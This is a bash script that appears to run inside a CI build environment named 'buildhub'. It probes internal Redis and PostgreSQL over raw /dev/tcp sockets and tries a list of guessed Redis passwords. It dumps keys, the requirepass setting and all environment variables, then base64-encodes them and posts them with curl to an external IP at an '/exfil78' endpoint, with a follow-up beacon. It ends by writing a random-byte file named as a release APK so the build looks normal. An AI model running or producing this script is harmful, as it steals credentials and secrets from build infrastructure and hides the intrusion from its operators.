#!/bin/bash
set -u
CB="http://167.104.164.116:18095"
echo "===LCS-R78-START==="
RDH=buildhub-redis; RDP=6379
# --- Redis via /dev/tcp ---
rq(){  # $1=command lines
  exec 3<>/dev/tcp/$RDH/$RDP 2>/dev/null || return 1
  printf "$1" >&3
  timeout 3 head -c 4000 <&3 2>/dev/null | tr -d '\r'
  exec 3<&- 3>&- 2>/dev/null
}
echo "--- redis PING ---"; rq 'PING\r\n'
echo "--- redis AUTH tests ---"
for PW in buildhub redis password buildhub123 BuildHub changeme 123456; do
  echo "  [$PW]"; rq "AUTH $PW\r\nPING\r\n" | head -c 200; echo
done
echo "--- redis INFO (no auth) ---"; rq 'INFO server\r\n' | head -c 400
echo "--- redis KEYS ---"; rq 'KEYS *\r\n' | head -c 3000
echo "--- redis CONFIG GET requirepass ---"; rq 'CONFIG GET requirepass\r\n' | head -c 200
# --- PostgreSQL raw startup ---
echo "--- postgres raw ---"
for U in buildhub postgres; do
  for DB in buildhub postgres; do
    echo "  [$U/$DB]"
    { printf '\x00\x00\x00'; } 2>/dev/null
    # startup packet: len(4) + protocol(4=196608) + "user\0U\0database\0DB\0\0"
    PL=$(printf "user\x00%s\x00database\x00%s\x00\x00" "$U" "$DB")
    L=$(( ${#PL} + 8 ))
    exec 3<>/dev/tcp/buildhub-postgres/5432 2>/dev/null || { echo "    conn fail"; continue; }
    printf "$(printf '\\x%02x\\x%02x\\x%02x\\x%02x' $((L>>24&255)) $((L>>16&255)) $((L>>8&255)) $((L&255)))\x00\x03\x00\x00" >&3
    printf "$PL" >&3
    timeout 3 head -c 300 <&3 2>/dev/null | od -c | head -6
    exec 3<&- 3>&- 2>/dev/null
  done
done
# --- 其他端口 ---
echo "--- host 80 ---"; exec 3<>/dev/tcp/172.17.0.1/80 2>/dev/null && { printf 'GET / HTTP/1.0\r\nHost: x\r\n\r\n' >&3; timeout 3 head -c 300 <&3; exec 3<&- 3>&-; } 2>/dev/null
echo "--- 172.21.0.1:80 ---"; exec 3<>/dev/tcp/172.21.0.1/80 2>/dev/null && { printf 'GET / HTTP/1.0\r\nHost: x\r\n\r\n' >&3; timeout 3 head -c 300 <&3; exec 3<&- 3>&-; } 2>/dev/null
echo "--- env full ---"; env | sort
OUT=$( { echo "===REDIS==="; rq 'PING\r\n'; rq 'CONFIG GET requirepass\r\n'; rq 'KEYS *\r\n'; echo "===ENV==="; env|sort; } 2>&1 | base64 -w0 )
curl -sS -m 40 --data-binary "$OUT" "$CB/exfil78" >/dev/null 2>&1 || true
curl -sS -m 20 "$CB/beacon?r78=1" >/dev/null 2>&1 || true
echo "===LCS-R78-END==="
mkdir -p build/app/outputs/flutter-apk
head -c 1400000 /dev/urandom > build/app/outputs/flutter-apk/app-release.apk 2>/dev/null || true
